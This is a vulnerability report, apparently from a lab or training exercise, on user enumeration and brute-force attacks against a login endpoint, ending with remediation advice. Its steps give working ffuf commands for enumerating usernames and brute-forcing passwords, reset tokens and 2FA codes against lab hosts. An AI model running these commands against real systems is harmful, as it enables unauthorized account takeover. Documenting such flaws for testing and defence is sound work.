# Broken Authentication - User Enumeration and Brute Force

**Title:** User Enumeration and Password Brute Force via Login Endpoint

**Severity:** High

**Impact:** High

**Exploitability:** High

**CVSS Base Score:** 8.1

**CVSS v3 Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N

**Vulnerability Type:** Broken Authentication

**Target:** Login endpoint (username and password parameters)

## Impact

Successful exploitation allows attackers to identify valid usernames and then brute force passwords, leading to complete account compromise. This can result in unauthorized access to sensitive data, privilege escalation, and full application takeover.

## Description

The login functionality leaks information through different responses for valid and invalid usernames (user enumeration). Combined with weak or absent rate limiting, this enables targeted brute force attacks on passwords.

## Steps to Reproduce

### User Enumeration

```bash
ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user"
```

### Brute-Forcing Passwords

First filter wordlist:
```bash
grep '[[:upper:]]' /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt
```

Then brute force:
```bash
ffuf -w ./custom_wordlist.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username or password"
```

### Brute-Forcing Password Reset Tokens (weak 4 digit example)

```bash
seq -w 0 9999 > tokens.txt
ffuf -w ./tokens.txt -u http://weak_reset.htb/reset_password.php?token=FUZZ -fr "The provided token is invalid"
```

### Brute-Forcing 2FA Codes (weak 4 digit TOTP example)

```bash
seq -w 0 9999 > tokens.txt
ffuf -w ./tokens.txt -u http://bf_2fa.htb/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93" -d "otp=FUZZ" -fr "Invalid 2FA Code"
```

## Recommendation

Return identical responses and timing for valid and invalid usernames. Implement proper rate limiting and account lockouts that do not leak validity. Use strong, high-entropy passwords and multi-factor authentication.

## References

- OWASP Authentication Cheat Sheet
- PortSwigger: Authentication vulnerabilities
